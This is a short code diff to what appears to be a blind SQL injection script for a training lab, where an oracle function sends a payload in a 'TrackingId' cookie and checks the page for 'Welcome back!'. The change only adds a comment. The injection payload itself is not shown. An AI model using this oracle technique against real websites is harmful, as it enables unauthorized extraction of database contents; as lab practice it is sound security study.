@@ -14,7 +14,7 @@ def oracle(q):
     cookies = {
         "TrackingId": payload
     }
-    response = requests.get(url(),cookies=cookies)
+    response = requests.get(url(),cookies=cookies) # Identify where the injection is 
     return "Welcome back!" in response.text  # Observe the response, and modify it
 
 # confirm oracle can run
